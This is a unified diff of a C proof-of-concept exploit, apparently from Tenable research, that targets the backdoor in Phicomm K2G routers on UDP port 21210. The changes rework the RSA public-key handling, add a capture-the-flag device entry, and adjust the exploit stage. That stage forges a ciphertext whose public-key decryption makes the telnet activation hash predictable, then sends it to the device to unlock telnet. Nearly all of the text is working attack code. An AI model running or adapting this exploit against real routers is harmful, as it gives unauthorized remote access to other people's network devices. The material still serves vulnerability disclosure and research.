--- /home/lucca/Tenable/PoCs/ZeroDay_PoCs/phicomm-k2g-backdoor-lockpick/lockpick.c	2021-10-12 14:50:28.055926178 -0300
+++ lockpick.c	2021-10-14 17:45:24.042522602 -0300
@@ -12,9 +12,11 @@
 #include <openssl/md5.h>
 #include <openssl/rsa.h>
 
+#include "../src/rsa-components/n.h"
+#include "../src/rsa-components/e.h"
 
 #define SCAN_DELAY  300000
-#define STAGE_DELAY 10000
+#define STAGE_DELAY 100000
 #define BACKDOOR_PORT 21210
 #define TELNET_PORT 23
 #define PLAINTEXT_LENGTH 0x20
@@ -28,6 +30,14 @@
 #define K2G_DEVICE_IDENTIFIER "K2_COSTDOWN__VER_3.0"
 //#define DEVICE_IDENTIFIER "what_if_it_was_wrong"
 
+
+void print_from(struct sockaddr_in *from) {
+  char *ns;
+  ns = inet_ntoa(from->sin_addr);
+  fprintf(stdout, "[<] remote address %s:%d\n", ns, ntohs(from->sin_port) & 0xFFFF);
+  return;
+}
+
 /////// Hexdump code
 
 void fhexdump(FILE *fd, unsigned char *data, int len) {
@@ -85,18 +95,19 @@
 
 #define K2G_HARDCODED_n  "E541A631680C453DF31591A6E29382BC5EAC969DCFDBBCEA64CB49CBE36578845C507BF5E7A6BCD724AFA7063CA754826E8D13DBA18A2359EB54B5BE3368158824EA316A495DDC3059C478B41ABF6B388451D38F3C6650CDB4590C1208B91F688D0393241898C1F05A6D500C7066298C6BA2EF310F6DB2E7AF52829E9F858691"
 
-#define K2G_HARDCODED_e 0x10001
 
+#define K2G_HARDCODED_e "010001"
 
-RSA *init_rsa(char *public_n, int public_e) {
+
+RSA *init_rsa(const char *public_n, const char *public_e) {
   BIGNUM *e;
   BIGNUM *n;
   RSA *rsa;
   rsa = RSA_new();
   n = BN_new();
   e = BN_new();
-  BN_set_word(e, public_e);
   BN_hex2bn(&n, public_n);
+  BN_hex2bn(&e, public_e);
   rsa->e = e;
   rsa->n = n;
   return rsa;
@@ -244,10 +255,10 @@
   printf("[>] Message sent.\n");
 
 
-  if (resp_len) {
+  if (resp_len > 0) {
     printf("[-] Expecting %d bytes in reply...\n", resp_len);
     printf("[-] Setting socket timeout to %lds + %ldus\n", tv.tv_sec, tv.tv_usec);
-    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    //setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
     
     // Here we might want to read from the socket in chunks, without
     // blocking indefinitely...
@@ -255,6 +266,8 @@
     n = recvfrom(sockfd, resp, resp_len, NO_FLAGS,
         (struct sockaddr *) &server_resp_addr, &len);
 
+    print_from(&server_resp_addr);
+
     printf("\n[<] Received %ld bytes in reply:\n", n);
     hexdump(resp, n);
   }
@@ -298,7 +311,7 @@
   unsigned char *hash;
   const char *identifier;
   const char *public_n;
-  int public_e;
+  const char *public_e;
   struct DeviceList *next;
 };
 
@@ -306,7 +319,7 @@
 struct DeviceList * add_entry_to_device_list(struct DeviceList *DL, 
     const char *identifier,
     const char *public_n,
-    int public_e) {
+    const char *public_e) {
   struct DeviceList * node;
   node = DL;
 
@@ -336,7 +349,7 @@
   printf("[+] Added device to list:\n"
       "    - identifier: %s\n"
       "    - public_n: 0x%s\n"
-      "    - public_e 0x%X\n"
+      "    - public_e 0x%s\n"
       "    - hash:\n",
       identifier,
       public_n,
@@ -374,6 +387,11 @@
     K2G_HARDCODED_n,
     K2G_HARDCODED_e);
 
+  add_entry_to_device_list(DL,
+      "__TENABLE_S4x22__",
+      CTF_N,
+      CTF_E);
+
   return DL;
 }
 
@@ -446,7 +464,7 @@
 
 //// Exploit
 
-#define PHONY_CIPHERTEXT_LENGTH 0x20
+#define PHONY_CIPHERTEXT_LENGTH 0x80
 
 void random_buffer(unsigned char *buf, int len) {
   FILE *urandom;
@@ -458,8 +476,9 @@
 
 unsigned char *find_phony_ciphertext(RSA *rsa) {
   unsigned char *phony_ciphertext;
-  unsigned char phony_plaintext[0x80];
-  memset(phony_plaintext, 0, 0x80);
+  unsigned char phony_plaintext[1024];
+  int plaintext_length;
+  memset(phony_plaintext, 0, 0x20);
   phony_ciphertext = calloc(PHONY_CIPHERTEXT_LENGTH, sizeof(char));
   do {
 
@@ -473,10 +492,10 @@
       printf("[-] We don't have a matching public key for this target\n"
           "    so we'll just throw random buffers at it and see what sticks.\n"
           "    returning:\n");
-      hexdump(phony_ciphertext, PLAINTEXT_LENGTH);
+      hexdump(phony_ciphertext, PHONY_CIPHERTEXT_LENGTH);
       return phony_ciphertext;
     }
-    decrypt_with_pubkey(rsa, phony_ciphertext, phony_plaintext); 
+    plaintext_length = decrypt_with_pubkey(rsa, phony_ciphertext, phony_plaintext); 
     // If the first character of phony_plaintext is printable, then
     // there is a chance it will collide with the first character of
     // the secret, random string. Since the phony_plaintext will be
@@ -485,11 +504,13 @@
     // operation that's used to produce the telnet activation keys
     // to append an EMPTY STRING to the salt/suffix. And this will
     // make the MD5 hash of the secret predictable.
-    if ((0x21 <= phony_plaintext[0]) && (phony_plaintext[0] < 0x7f)) {
+    if ((plaintext_length < 0x101) && 
+        (0x21 <= phony_plaintext[0]) && 
+        (phony_plaintext[0] < 0x7f)) {
       printf("[!] Found stage 2 payload:\n");
-      hexdump(phony_ciphertext, PLAINTEXT_LENGTH);
-      printf("[=] Decrypts to:\n");
-      hexdump(phony_plaintext, PLAINTEXT_LENGTH);
+      hexdump(phony_ciphertext, PHONY_CIPHERTEXT_LENGTH);
+      printf("[=] Decrypts to (%d bytes):\n", plaintext_length);
+      hexdump(phony_plaintext, plaintext_length);
       return phony_ciphertext;
     }
   } while (1);
@@ -729,10 +750,10 @@
     bar('=');
     memset(buffer, 0, CIPHERTEXT_LENGTH);
     phony_ciphertext = find_phony_ciphertext(rsa);  
-    // This blocks and waits to long in CHAOS_MODE
+    // This blocks and waits too long in CHAOS_MODE
     com_res = communicate(ip_addr, backdoor_port,
         phony_ciphertext,
-        0x20,
+        PHONY_CIPHERTEXT_LENGTH,
         buffer,
         CIPHERTEXT_LENGTH,
         stage_delay);
